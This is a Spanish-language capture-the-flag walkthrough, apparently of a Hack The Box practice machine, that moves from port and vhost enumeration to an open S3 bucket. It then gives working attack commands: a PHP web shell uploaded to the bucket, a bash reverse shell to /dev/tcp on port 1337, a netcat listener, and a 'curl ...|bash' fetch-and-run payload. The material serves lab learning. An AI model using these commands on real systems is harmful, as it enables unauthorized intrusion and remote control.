1. **Escaneamos los puertos averiguando los servicios que corren. El `-v` es para que me vaya diciendo a tiempo real lo que va encontrando.**
```bash
nmap -sVC -v [target IP]
```
--> 22/tcp - open - ssh
--> 80/tcp - open - http

2. **Entramos desde nuestro navegador a la IP de la máquina objetivo ya que vemos que tiene el puerto HTTP abierto.**
--> Vemos una página estática con compras de tickets para conciertos de una banda.

3. **Vamos a instalar una extensión para nuestro navegador llamada Wappalyzer. Con esta extensión, vamos a ver las tecnologías que está usando esta página.**
--> Vemos que la página está escrita en PHP.

4. **Nos movemos por la web y la investigamos y descubrimos que tienen un correo electrónico con un dominio. El dominio es `thetoppers.htb`, así que vamos a añadir este dominio a nuestro archivo `/etc/hosts` con la IP de la máquina objetivo.**
```bash
sudo nano /etc/hosts

[target IP]    thetoppers.htb
```

5. **Ahora, vamos a hacer una enumeración de los subdominios de la página.** 
Vamos a usar [[Gobuster]] pero en vez de enumerar los directorios de la web, vamos a enumerar los subdominios que tenga. 
Para eso, tenemos que usar otra wordlist a la que estamos acostumbrados a usar para encontrar subdominios DNS típicos. Vamos a buscar una buena wordlist como las de SecLists: https://github.com/danielmiessler/SecLists.git.
En vez de usar la opción `dir`, usamos la opción `vhost`.
Como en mi caso tengo una versión de Gobuster superior a la 3.2.0, tengo que usar el `--append-domain` para tener en cuenta el vHost conocido (`thetoppers.htb` en este caso) y agregarle las palabras que se encuentren (`word.thetoppers.htb`).
```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```
--> Como resultado obtenemos lo siguiente:
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://thetoppers.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb Status: 404 [Size: 21]
Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

6. Voy a añadir a mi archivo `/etc/hosts` este subdominio que he encontrado.
```bash
sudo nano /etc/hosts

[target IP]   s3.thetoppers.htb
```
--> Vemos el resultado `{"status": "running"}` en JSON.

7. Buscamos en Google qué es un subdominio s3 que esté en el estado "running" y encontramos que S3 es un cubo o contenedor de AWS (Amazon Web Services).

8. **Vamos a instalar y configurar la herramienta [[Awscli]] para interactuar con este contenedor S3.**
```bash
#Instalamos awscli
sudo apt install awscli

#Configuramos awscli de forma arbitraria 
aws configure

AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

9. Ahora podemos listar los contenedores S3 que está hosteando el servidor con `ls`
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```
--> 2024-11-03   16:07:12   thetoppers.htb

10. Al saber qué contenedor S3 está hosteando el servidor, vamos a listar los objetos que están en ese contenedor.
```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
--> Vemos que hay un directorio llamado `images/`, un archivo llamado `.htaccess` y el archivo `index.php`. Esto nos indica que aquí se está almacenando los archivos del servidor web que está corriendo por el puerto 80. Este es el directorio raíz del servidor web.

Como antes comprobamos con la extensión que la página está escrita en PHP, vamos a intentar:
1. Subir un archivo Shell PHP a este contenedor S3
2. Acceder a la web para que se ejecute el código que acabamos de subir
3. Ejecutar una consola

11. Creamos el archivo PHP que vamos a subir
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

12. Copiamos el archivo al contenedor S3 con `cp`
```bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```
--> upload: ./shell.php to s3://thetoppers.htb/shell.php

13. Confirmamos que nuestra consola se ha subido entrando al enlace http://thetoppers.htb/shell.php y cambiandolo para probar comandos en la consola que hemos creado.
```bash
http://thetoppers.htb/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data) 

http://thetoppers.htb/shell.php?cmd=ls
images index.php shell.php 

http://thetoppers.htb/shell.php?cmd=whoami
www-data
```
--> Como nos está dando resultados, hemos confirmado que nuestra consola funciona y ahora tenemos una reverse-shell.

A través de una Reverse-Shell, podemos a hacer que el servidor se conecte a nuestra máquina local por el puerto de escucha que configuremos.

14. **Creamos un nuevo archivo llamado `shell.sh` que contendrá el Payload de la Reverse-Shell con el cual el servidor se conectará a nuestra máquina local por el puerto 1337.**
```bash
sudo nano shell.sh

#!/bin/bash
bash -i >& /dev/tcp/[My IP]/1337 0>&1
```
--> Le añadimos ese script al archivo.

15. Ahora vamos a empezar a escuchar por nuestro puerto 1337 con NetCat.
El `-n` es para que sea solo numérico (solo direcciones IPs, no DNS)
El `-v` es para que sea "verbose" y vaya explicando lo que va escuchando
El `-l` es para poner el modo "listening" (escucha)
El `-p` es para indicar el puerto por el que vamos a escuchar
```bash
nc -nvlp 1337
```

16. Abrimos otra pestaña en la terminal y vamos a arrancar un servidor web en nuestra máquina local, en el puerto 8000, que aloje este `shell.sh`.  Este servidor tenemos que arrancarlo en el mismo directorio donde tengamos el archivo `shell.sh`. En mi caso, lo tengo en `/home/kali` (mi directorio raíz de mi usuario), así que voy hasta allí y ejecuto el siguiente comando:
```bash
python3 -m http.server 8000
```

17. Ahora vamos a la URL donde teníamos la Shell de PHP y le hacemos un `curl` a la dirección del Payload `shell.sh` de nuestra máquina local.
```bash
#El %20 es un espacio
http://thetoppers.htb/shell.php?cmd=curl%20[My IP]:8000/shell.sh|bash
```
--> Con la URL accedemos al recurso `shell.sh` y con la tubería y el comando `bash`, lo ejecutamos y al ir a la pestaña donde tenemos el NetCat escuchando, obtenemos la Reverse-Shell.
--> **MACHINE PWNED!**

18. Ya podemos movernos por la consola y buscar y encontramos la flag en /var/www/. La capturamos con:
```bash
cat /var/www/flag.txt
```
